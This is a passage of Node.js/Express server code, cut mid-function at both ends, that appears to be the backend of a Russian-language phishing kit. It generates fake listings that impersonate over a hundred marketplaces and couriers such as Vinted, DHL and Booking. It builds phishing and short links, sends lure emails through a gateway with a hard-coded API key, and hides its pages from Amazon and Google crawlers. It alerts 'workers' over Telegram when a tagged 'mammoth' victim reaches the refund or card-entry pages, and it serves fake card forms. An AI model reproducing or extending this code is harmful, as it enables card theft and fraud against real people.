    const support = await generateSupport(log.ad, req, res);

    const sendAutoIfNotExists = async (uid) => {
      const auto = await AutoTp.findOne({ where: { userId: uid, status: 6, countryId } });
      if (auto) {
        const exists = await SupportChat.findOne({
          where: {
            supportId: support.id,
            autoId: auto.id,
            isAuto: true,
          },
        });

        if (!exists) {
          await SupportChat.create({
            supportId: support.id,
            messageFrom: 0,
            message: replaceAutoPlaceholders(auto.text, log.ad),
            readed: 0,
            isTemplate: true,
            isAuto: true,
            autoId: auto.id,
          });
        }
      }
    };

    if (user.operator == null) await sendAutoIfNotExists(log.ad.userId);
    else {
      const operator = await Operators.findOne({ where: { userId: user.operator } });
      if (operator) await sendAutoIfNotExists(operator.userId);
    }

    res.sendStatus(200);
  } catch (err) {
    console.error(err);
    return res.status(500).send(err.message);
  }
});


app.get("/api/createCustom", async (req, res) => {
  try {
    const requiredParams = [
      "title",
      "id",
      "balanceChecker",
      "photo",
      "userId",
      "version",
      "logo",
    ];

    const missingParams = [];

    for (const param of requiredParams) {
      if (!req.query[param]) {
        missingParams.push(param);
      }
    }

    if (missingParams.length > 0) {
      return res.status(400).json({
        error: `Не хватает следующих параметров: ${missingParams.join(", ")}`,
      });
    }

    const service = await Service.findOne({
      where: {
        code: "service_eu",
      },
    });

    if (!service) {
      return res.sendStatus(404);
    }

    const {
      title,
      name,
      address,
      price,
      id,
      balanceChecker,
      photo,
      userId,
      version,
      logo,
    } = req.query;

    const ad = await Ad.create({
      id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
      userId,
      title,
      version,
      price,
      address,
      name,
      logo,

      serviceCode: id,
      balanceChecker,
      photo,
    });

    return res.json({
      url: `https://${service.domain}/${ad.id}`,
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Произошла ошибка на сервере" });
  }
});


app.get("/api/createAd", async (req, res) => {
  try {
    const requiredParams = ["title", "id", "balanceChecker", "photo", "userId"];
    const missingParams = requiredParams.filter(param => !req.query[param]);

    if (missingParams.length > 0) {
      return res.status(400).json({
        error: `Не хватает следующих параметров: ${missingParams.join(", ")}`,
      });
    }

    const { title, name, address, price, id, balanceChecker, photo, userId } = req.query;

    const service = await Service.findOne({ where: { code: id } });
    if (!service) return res.sendStatus(404);

    const ad = await Ad.create({
      id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
      userId,
      title,
      name,
      address,
      price,
      serviceCode: id,
      balanceChecker,
      photo,
    });

    const fullLink = `https://${service.domain}/${ad.id}`;
    let shortLink = null;
    let myDomainLink = null;

    // Получение личного домена (если есть)
    const domains = await MyDomains.findOne({ where: { userId } });
    if (domains?.domain) {
      myDomainLink = `https://${domains.domain}/${ad.id}`;
    }
    const settings = await Settings.findByPk(1); // достаём fallback shortlink

    // Сокращённая ссылка через API
    try {
      const reduction = await axios.post(
        "http://185.208.158.144/api/create",
        {
          target: fullLink,
          domain: service.shortlink || settings.shortlink, // приоритет у сервиса
        },
        { timeout: 2000 }
      );

      shortLink = reduction.data.url;
    } catch (error) {
      console.error("❌ Ошибка при создании сокращённой ссылки:", error.message);
    }

    // Обновляем объявление
    await ad.update({
      myDomainLink,
      shortLink,
    });

    return res.json({
      url: fullLink,
      short: shortLink,
      my: myDomainLink,
      adId: ad.id,

    });
  } catch (err) {
    console.error("❌ Ошибка в /api/createAd:", err);
    return res.status(500).json({ error: "Произошла ошибка на сервере" });
  }
});
const qs = require('qs');

app.get("/api/sendEmailMeow", async (req, res) => {
  try {
    const { mail, adId } = req.query;
    if (!mail || !adId) {
      return res.status(400).json({ error: "Не указаны обязательные параметры: mail или adId" });
    }

    const ad = await Ad.findOne({ where: { id: adId } });
    if (!ad) return res.status(404).json({ error: "Объявление не найдено" });

    const service = await Service.findOne({ where: { code: ad.serviceCode } });
    if (!service) return res.status(404).json({ error: "Сервис не найден" });

    const sendService = {
      fiverr_com: "fiverr_eu",
      fiverr_eu: "fiverr_eu",
      adverts_ie: "adverts_ie",
      agoda_eu: "agoda_eu",
      agodaa_eu: "agodaa_eu",
      airbnb_eu: "airbnb_eu",
      anibis_ch: "anibis_ch",
      aramex_ae: "aramex_ae",
      auspost_au: "auspost_au",
      bahrainpost_bh: "bahrainpost_bh",
      bazaraki_cy: "bazaraki_cy",
      beatstars_eu: "beatstars_eu",
      beebs_fr: "beebs_fr",
      benefit_bh: "benefit_bh",
      blocket_se: "blocket_se",
      booking_eu: "booking_eu",
      bookingred_eu: "bookingred_eu",
      carousell_ph: "carousell_ph",
      correos_es: "correos_es",
      ctt_pt: "ctt_pt",
      dalilee_om: "dalilee_om",
      dao_dk: "dao_dk",
      depop_au: "depop_au",
      depop_com: "depop_com",
      depop_de: "depop_de",
      depop_uk: "depop_uk",
      depop_us: "depop_us",
      dhl_de: "dhl_de",
      dhl_nl: "dhl_nl",
      discogs_eu: "discogs_eu",
      dpd_eu: "dpd_eu",
      dpd_hr: "dpd_hr",
      dpd_sk: "dpd_sk",
      ebaykleinanzeigen_de: "ebaykleinanzeigen_de",
      ebayverif_eu: "ebayverif_eu",
      ebeys_eu: "ebeys_eu",
      ebid_eu: "ebid_eu",
      econt_bg: "econt_bg",
      eliver_ae: "eliver_ae",
      elo_br: "elo_br",
      emiratespost_ae: "emiratespost_ae",
      etsy_de: "etsy_de",
      etsy_eu: "etsy_eu",
      etsyverif_eu: "etsyverif_eu",
      euroexpress_ba: "euroexpress_ba",
      expedia_eu: "expedia_eu",
      fedex_ae: "fedex_ae",
      fedex_ca: "fedex_ca",
      fedex_kw: "fedex_kw",
      fedex_om: "fedex_om",
      fedex_qa: "fedex_qa",
      fedex_tr: "fedex_tr",
      gls_cz: "gls_cz",
      gls_hu: "gls_hu",
      gls_sl: "gls_sl",
      gumtree_au: "gumtree_au",
      gumtree_uk: "gumtree_uk",
      hostelworld_eu: "hostelworld_eu",
      interac_ca: "interac_ca",
      kwpost_kw: "kwpost_kw",
      lalamove_sg: "lalamove_sg",
      lebocoinn_fr: "lebocoinn_fr",
      leboncoin_fr: "leboncoin_fr",
      letgo_tr: "letgo_tr",
      marktplaats_nl: "marktplaats_nl",
      milanuncios_es: "milanuncios_es",
      mzadqatar_qa: "mzadqatar_qa",
      nextdoor_eu: "nextdoor_eu",
      nextdoorverif_eu: "nextdoorverif_eu",
      njuskalo_hr: "njuskalo_hr",
      nooloman_om: "nooloman_om",
      nzpost_nz: "nzpost_nz",
      olx_ro: "olx_ro",
      omanpost_om: "omanpost_om",
      opensooq_kw: "opensooq_kw",
      opensooq_om: "opensooq_om",
      opensooq_sa: "opensooq_sa",
      packeta_sk: "packeta_sk",
      plick_se: "plick_se",
      poshmark_eu: "poshmark_eu",
      posta_ba: "posta_ba",
      postnord_se: "postnord_se",
      qatarpost_qa: "qatarpost_qa",
      quokaverif_de: "quokaverif_de",
      ricardo_ch: "ricardo_ch",
      royalmail_uk: "royalmail_uk",
      service_eu: "service_eu",
      stdibs_eu: "stdibs_eu",
      subito_it: "subito_it",
      swisspost_ch: "swisspost_ch",
      tori_fi: "tori_fi",
      trademe_nz: "trademe_nz",
      tradera_se: "tradera_se",
      travelexpress_cy: "travelexpress_cy",
      vestiairecollective_eu: "vestiairecollective_eu",
      vinted_at: "vinted_at",
      vinted_cz: "vinted_cz",
      vinted_de: "vinted_de",
      vinted_dk: "vinted_dk",
      vinted_es: "vinted_es",
      vinted_fr: "vinted_fr",
      vinted_hu: "vinted_hu",
      vinted_it: "vinted_it",
      vinted_nl: "vinted_nl",
      vinted_pt: "vinted_pt",
      vinted_se: "vinted_se",
      vinted_uk: "vinted_uk",
      vintedverif_pt: "vintedverif_pt",
      wallapop_es: "wallapop_es",
      wallapop_fr: "wallapop_fr",
      wallapop_it: "wallapop_it",
      wallapop_pt: "wallapop_pt",
      whatnot_eu: "whatnot_eu",
      willhaben_at: "willhaben_at",
      yad2_il: "yad2_il",
    };

    // Формируем данные для отправки
    const data = {
      api_key: "323dc07c-a86e-4839-aca3-911f1f83eb76",
      url: `https://${service.domain}/me/${ad.id}`,
      user_id: ad.userId,
      service: sendService[ad.serviceCode],
      email: mail,
    };

    if (ad.price) {
      data.price = parseFloat(ad.price);
    }

    // Сериализация данных для x-www-form-urlencoded
    const serializedData = qs.stringify(data);

    // Отправка запроса на meowgateway
    const response = await axios.post("https://meowgateway.com/email", serializedData, {
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      timeout: 10000,
    });

    if (response.status === 200) {
      return res.json({ message: "Письмо успешно отправлено", data: response.data });
    } else {
      return res.status(response.status).json({ error: `Ошибка API: ${response.statusText}` });
    }
  } catch (err) {
    console.error("Ошибка при отправке письма:", err.message);
    const errorMsg = err.response?.data?.error || err.message || "Неизвестная ошибка";
    return res.status(500).json({ error: `Ошибка при отправке письма: ${errorMsg}` });
  }
});
app.get("/reservation/", async (req, res) => {
  try {
    // Здесь может быть код для подготовки данных, если необходимо
    return res.render("reservation"); // Убедитесь, что у вас есть шаблон 'reservation' в вашей системе шаблонов
  } catch (err) {
    console.error(err); // Хорошая практика - логировать ошибку
    return res.status(500).send(err); // Отправка ошибки с кодом 500
  }
});
app.get("/check-id/:code", async (req, res) => {
  try {
    const ad = await Ad.findByPk(req.params.code);
    if (ad) {
      res.json({ exists: true });
    } else {
      res.json({ exists: false });
    }
  } catch (error) {
    res.status(500).send("Server error");
  }
});

app.all("/:adId", async (req, res, next) => {
  if (req.method === "POST") {
    // Перенаправляем на тот же маршрут с GET
    return res.redirect(303, req.originalUrl); // 303 — правильный статус для "POST → GET"
  }
  next();
});

app.get("/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.connection.remoteAddress;

    try {
      const whoisData = await whois(ip);
      const org = whoisData.org || "";
      const netname = whoisData.netname || "";
      const hostname = req.hostname || "";

      // Проверка: Amazon AWS
      if (
        (hostname && hostname.includes("amazonaws")) ||
        (org && org.includes("Amazon")) ||
        (netname && netname.includes("Amazon"))
      ) {
        return res.sendStatus(200); // Можно заменить на редирект или пустой ответ
      }

      // Проверка: Google
      if (hostname && hostname.includes("google")) {
        return res.sendStatus(404);
      }

      // Можно добавить другие проверки (Cloudflare, Microsoft, OVH и т.д.)
    } catch (whoisErr) {
      console.error("❌ WHOIS error:", whoisErr.message);
    }

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);

    const user = await User.findOne({
      where: {
        id: ad.userId,
      },
    });
    if (!user) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);

    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    const serviceCodeParts = ad.serviceCode.split("_");
    let countryId = serviceCodeParts.pop(); // Извлекаем код страны

    // Если countryId === 'com', заменяем его на 'eu'
    if (countryId === "com") {
      countryId = "eu";
    }

    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, ad)}`;

    const support = await generateSupport(ad, req, res);

    const auto = await AutoTp.findOne({
      where: { userId: ad.userId, status: 1, countryId }, // Фильтруем по стране
    });

    if (auto && user.operator == null) {
      const autoText = replaceAutoPlaceholders(auto.text, ad);

      const supportText = await SupportChat.findOne({
        where: {
          supportId: support.id,
          autoId: auto.id, // 👈 проверка по autoId
          isAuto: true,
        },
      });

      if (!supportText) {
        await SupportChat.create({
          supportId: support.id,
          messageFrom: 0,
          message: autoText,
          readed: 0,
          isTemplate: true,
          isAuto: true,
          autoId: auto.id, // 👈 ОБЯЗАТЕЛЬНО: сохраняем autoId
        });
      }
    }

    if (user.perehod == true) {
      bot
        .sendMessage(
          ad.userId,
          `<b>🔗 Переход по ссылке ${ad.service.title}</b>    

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

              [
                Markup.callbackButton(
                  "✍️ Сообщение в ТП",
                  `support_${support.id}_send_message`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${support.id}_${user.id}`
                ),
              ],
              [
                Markup.callbackButton("🔓 Открыть ТП", `open_support_${ad.id}`),
                Markup.callbackButton(
                  "🔒 Закрыть ТП",
                  `close_support_${ad.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔽 Дополнительно",
                  `more_actions_${ad.id}_${support.id}`
                ),
              ],
            ]),
          }
        )
        .catch((err) => err);
    }

    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });
      const userOperator = await User.findOne({ where: { id: user.operator } });

      const autoOperator = await AutoTp.findOne({
        where: { userId: operator.userId, status: 1, countryId }, // Фильтруем по стране
      });

      if (autoOperator) {
        const autoText = replaceAutoPlaceholders(autoOperator.text, ad);

        const supportTextOperator = await SupportChat.findOne({
          where: {
            supportId: support.id,
            autoId: autoOperator.id, // 👈 Проверка по ID шаблона
            isAuto: true,
          },
        });

        if (!supportTextOperator) {
          await SupportChat.create({
            supportId: support.id,
            messageFrom: 0,
            message: autoText,
            readed: 0,
            isTemplate: true,
            isAuto: true,
            autoId: autoOperator.id, // 👈 Сохраняем ID шаблона
          });
        }
      }
      if (userOperator?.perehod === true) {
        await bot
          .sendMessage(
            operator.userId,
            `<b>🔗 Переход по ссылке ${ad.service.title}</b>

👤 Воркер: <b>${user.username
              ? `@${user.username}`
              : `ID: <code>${user.id}</code>`
            }</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
            {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

                [
                  Markup.callbackButton(
                    "✍️ Ответить за воркера",
                    `operatorSend_${support.id}_send_message_${user.id}_${ad.id}`
                  ),
                  Markup.callbackButton(
                    "📋 Шаблоны ТП",
                    `tempSupport_${support.id}_${user.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔓 Открыть ТП",
                    `open_support_${ad.id}`
                  ),
                  Markup.callbackButton(
                    "🔒 Закрыть ТП",
                    `close_support_${ad.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔽 Дополнительно",
                    `more_actions_${ad.id}_${support.id}`
                  ),
                ],
              ]),
            }
          )
          .catch((err) => err);
      }
    }
    try {
      const serviceCodeParts = ad.serviceCode.split("_");
      const basePath = `fakes/${serviceCodeParts[1]}/${serviceCodeParts[0]}`;
      const baseDir = path.join(__dirname, "..", "web", "views", basePath);

      const path10 = path.join(baseDir, "10.html");
      const pathVerif = path.join(baseDir, "verif.html");

      let templateToRender = "index";

      if (ad.version === 1 && fs.existsSync(path10)) {
        templateToRender = "10";
      } else if (ad.version === 0 && fs.existsSync(pathVerif)) {
        templateToRender = "verif";
      }

      return res.render(`${basePath}/${templateToRender}.html`, {
        translate,
        user,
        ad,
        support,
      });
    } catch (err) {
      console.log(err);
      return res.send(err);
    }
  } catch (err) {
    console.log(err)
    return res.send(err);
  }
});

app.get("/refund/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.connection.remoteAddress;

    try {
      const whoisData = await whois(ip);
      const org = whoisData.org || "";
      const netname = whoisData.netname || "";
      const hostname = req.hostname || "";

      // Проверка: Amazon AWS
      if (
        (hostname && hostname.includes("amazonaws")) ||
        (org && org.includes("Amazon")) ||
        (netname && netname.includes("Amazon"))
      ) {
        return res.sendStatus(200); // Можно заменить на редирект или пустой ответ
      }

      // Проверка: Google
      if (hostname && hostname.includes("google")) {
        return res.sendStatus(404);
      }

      // Можно добавить другие проверки (Cloudflare, Microsoft, OVH и т.д.)
    } catch (whoisErr) {
      console.error("❌ WHOIS error:", whoisErr.message);
    }

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);

    const user = await User.findOne({
      where: {
        id: ad.userId,
      },
    });
    if (!user) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);

    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, ad)}`;

    const support = await generateSupport(ad, req, res);
    const serviceCodeParts = ad.serviceCode.split("_");
    let countryId = serviceCodeParts.pop(); // Извлекаем код страны

    // Если countryId === 'com', заменяем его на 'eu'
    if (countryId === "com") {
      countryId = "eu";
    }

    bot
      .sendMessage(
        ad.userId,
        `<b>🔗 Переход на возврат ${ad.service.title}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

            [
              Markup.callbackButton(
                "✍️ Сообщение в ТП",
                `support_${support.id}_send_message`
              ),
              Markup.callbackButton(
                "📋 Шаблоны ТП",
                `tempSupport_${support.id}_${user.id}`
              ),
            ],
            [
              Markup.callbackButton("🔓 Открыть ТП", `open_support_${ad.id}`),
              Markup.callbackButton("🔒 Закрыть ТП", `close_support_${ad.id}`),
            ],
            [
              Markup.callbackButton(
                "🔽 Дополнительно",
                `more_actions_${ad.id}_${support.id}`
              ),
            ],
          ]),
        }
      )
      .catch((err) => err);

    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });
      const userOperator = await User.findOne({ where: { id: user.operator } });
      if (userOperator?.perehod === true) {
        await bot
          .sendMessage(
            operator.userId,
            `<b>🔗 Переход на возврат ${ad.service.title}</b>   

👤 Воркер: <b>${user.username
              ? `@${user.username}`
              : `ID: <code>${user.id}</code>`
            }</b>
 
📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>
`,
            {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

                [
                  Markup.callbackButton(
                    "✍️ Ответить за воркера",
                    `operatorSend_${support.id}_send_message_${user.id}_${ad.id}`
                  ),
                  Markup.callbackButton(
                    "📋 Шаблоны ТП",
                    `tempSupport_${support.id}_${user.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔓 Открыть ТП",
                    `open_support_${ad.id}`
                  ),
                  Markup.callbackButton(
                    "🔒 Закрыть ТП",
                    `close_support_${ad.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔽 Дополнительно",
                    `more_actions_${ad.id}_${support.id}`
                  ),
                ],
              ]),
            }
          )
          .catch((err) => err);
      }
    }
    try {
      let countryIdRender = countryId === "eu" ? "us" : countryId;

      let page = "refund";

      if (user.provider === "stripe") {
        page = "stripeRefund";
      } else if (user.provider === "square") {
        page = "squareRefund";
      }

      return res.render(page, {
        countryId: countryIdRender,

        user,
        ad,
        support,
        translate,
      });
    } catch (err) {
      console.log(err);
      return res.send(err);
    }

  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});

app.get("/adress/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.connection.remoteAddress;

    try {
      const whoisData = await whois(ip);
      const org = whoisData.org || "";
      const netname = whoisData.netname || "";
      const hostname = req.hostname || "";

      // Проверка: Amazon AWS
      if (
        (hostname && hostname.includes("amazonaws")) ||
        (org && org.includes("Amazon")) ||
        (netname && netname.includes("Amazon"))
      ) {
        return res.sendStatus(200); // Можно заменить на редирект или пустой ответ
      }

      // Проверка: Google
      if (hostname && hostname.includes("google")) {
        return res.sendStatus(404);
      }

      // Можно добавить другие проверки (Cloudflare, Microsoft, OVH и т.д.)
    } catch (whoisErr) {
      console.error("❌ WHOIS error:", whoisErr.message);
    }

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);

    const user = await User.findOne({
      where: {
        id: ad.userId,
      },
    });
    if (!user) return res.sendStatus(404);
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, ad)}`;

    const support = await generateSupport(ad, req, res);

    bot
      .sendMessage(
        ad.userId,
        `<b>🔗 Переход на Заполнение ${ad.service.title}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

            [
              Markup.callbackButton(
                "✍️ Сообщение в ТП",
                `support_${support.id}_send_message`
              ),
              Markup.callbackButton(
                "📋 Шаблоны ТП",
                `tempSupport_${support.id}_${user.id}`
              ),
            ],
            [
              Markup.callbackButton("🔓 Открыть ТП", `open_support_${ad.id}`),
              Markup.callbackButton("🔒 Закрыть ТП", `close_support_${ad.id}`),
            ],
            [
              Markup.callbackButton(
                "🔽 Дополнительно",
                `more_actions_${ad.id}_${support.id}`
              ),
            ],
          ]),
        }
      )
      .catch((err) => err);
    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });
      const userOperator = await User.findOne({ where: { id: user.operator } });
      if (userOperator?.perehod === true) {
        await bot
          .sendMessage(
            operator.userId,
            `<b>🔗 Переход на Заполнение ${ad.service.title}</b>
        
👤 Воркер: <b>${ad.user.username
              ? `@${ad.user.username}`
              : `Профиль (${ad.userId})`
            }</b>    

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>
`,
            {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

                [
                  Markup.callbackButton(
                    "✍️ Ответить за воркера",
                    `operatorSend_${support.id}_send_message_${user.id}_${ad.id}`
                  ),
                  Markup.callbackButton(
                    "📋 Шаблоны ТП",
                    `tempSupport_${support.id}_${user.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔓 Открыть ТП",
                    `open_support_${ad.id}`
                  ),
                  Markup.callbackButton(
                    "🔒 Закрыть ТП",
                    `close_support_${ad.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔽 Дополнительно",
                    `more_actions_${ad.id}_${support.id}`
                  ),
                ],
              ]),
            }
          )
          .catch((err) => err);
      }
    }

    return res.render(`dao/adress`, {
      ad,
      support,
      translate,
    });
  } catch (err) {
    return res.send(err);
  }
});

app.get("/ad/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.connection.remoteAddress;

    try {
      const whoisData = await whois(ip);
      const org = whoisData.org || "";
      const netname = whoisData.netname || "";
      const hostname = req.hostname || "";

      // Проверка: Amazon AWS
      if (
        (hostname && hostname.includes("amazonaws")) ||
        (org && org.includes("Amazon")) ||
        (netname && netname.includes("Amazon"))
      ) {
        return res.sendStatus(200); // Можно заменить на редирект или пустой ответ
      }

      // Проверка: Google
      if (hostname && hostname.includes("google")) {
        return res.sendStatus(404);
      }

      // Можно добавить другие проверки (Cloudflare, Microsoft, OVH и т.д.)
    } catch (whoisErr) {
      console.error("❌ WHOIS error:", whoisErr.message);
    }

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    if (ad.billing) {
      return res.redirect(`/billing/${ad.id}`);
    }
    const user = await User.findOne({
      where: {
        id: ad.userId,
      },
    });
    if (!user) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);

    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    const serviceCodeParts = ad.serviceCode.split("_");
    let countryId = serviceCodeParts.pop(); // Извлекаем код страны

    // Если countryId === 'com', заменяем его на 'eu'
    if (countryId === "com") {
      countryId = "eu";
    }
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, ad)}`;

    const support = await generateSupport(ad, req, res);

    const auto = await AutoTp.findOne({
      where: { userId: ad.userId, status: 5, countryId }, // Фильтруем по стране
    });

    if (auto && user.operator == null) {
      const autoText = replaceAutoPlaceholders(auto.text, ad);

      const supportText = await SupportChat.findOne({
        where: {
          supportId: support.id,
          autoId: auto.id, // 👈 проверка по autoId
          isAuto: true,
        },
      });

      if (!supportText) {
        await SupportChat.create({
          supportId: support.id,
          messageFrom: 0,
          message: autoText,
          readed: 0,
          isTemplate: true,
          isAuto: true,
          autoId: auto.id, // 👈 ОБЯЗАТЕЛЬНО: сохраняем autoId
        });
      }
    }


    if (user.card == true) {
      bot
        .sendMessage(
          ad.userId,
          `<b>💳 Переход на ввод карты ${ad.service.title}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

              [
                Markup.callbackButton(
                  "✍️ Сообщение в ТП",
                  `support_${support.id}_send_message`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${support.id}_${user.id}`
                ),
              ],
              [
                Markup.callbackButton("🔓 Открыть ТП", `open_support_${ad.id}`),
                Markup.callbackButton(
                  "🔒 Закрыть ТП",
                  `close_support_${ad.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔽 Дополнительно",
                  `more_actions_${ad.id}_${support.id}`
                ),
              ],
            ]),
          }
        )
        .catch((err) => err);
    }

    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });

      const autoOperator = await AutoTp.findOne({
        where: { userId: operator.userId, status: 5, countryId }, // Фильтруем по стране
      });

      if (autoOperator) {
        const autoText = replaceAutoPlaceholders(autoOperator.text, ad);

        const supportTextOperator = await SupportChat.findOne({
          where: {
            supportId: support.id,
            autoId: autoOperator.id, // 👈 Проверка по ID шаблона
            isAuto: true,
          },
        });

        if (!supportTextOperator) {
          await SupportChat.create({
            supportId: support.id,
            messageFrom: 0,
            message: autoText,
            readed: 0,
            isTemplate: true,
            isAuto: true,
            autoId: autoOperator.id, // 👈 Сохраняем ID шаблона
          });
        }
      }

      const userOperator = await User.findOne({ where: { id: user.operator } });
      if (userOperator?.card === true) {
        await bot
          .sendMessage(
            operator.userId,
            `<b>💳 Переход на ввод карты ${ad.service.title}</b>

👤 Воркер: <b>${user.username
              ? `@${user.username}`
              : `ID: <code>${user.id}</code>`
            }</b>
   
📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
            {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

                [
                  Markup.callbackButton(
                    "✍️ Ответить за воркера",
                    `operatorSend_${support.id}_send_message_${user.id}_${ad.id}`
                  ),
                  Markup.callbackButton(
                    "📋 Шаблоны ТП",
                    `tempSupport_${support.id}_${user.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔓 Открыть ТП",
                    `open_support_${ad.id}`
                  ),
                  Markup.callbackButton(
                    "🔒 Закрыть ТП",
                    `close_support_${ad.id}`
                  ),
                ],
                [
                  Markup.callbackButton(
                    "🔽 Дополнительно",
                    `more_actions_${ad.id}_${support.id}`
                  ),
                ],
              ]),
            }
          )
          .catch((err) => err);
      }
    }

    let countryIdRender = countryId === "eu" ? "us" : countryId;

    let page = "card";

    if (ad.serviceCode === "leboncoin_fr" && ad.version === 1) {
      page = "lebonCard";
    } else if (ad.serviceCode === "booking_eu") {
      page = "bookCard";
    } else if (ad.serviceCode?.startsWith("etsy")) {
      page = "etsyCard";
    } else if (user.provider === "stripe") {
      page = "stripeCard";
    } else if (user.provider === "square") {
      page = "squareCard";
    }



    return res.render(page, {
      countryId: countryIdRender,
      user,
      ad,
      support,
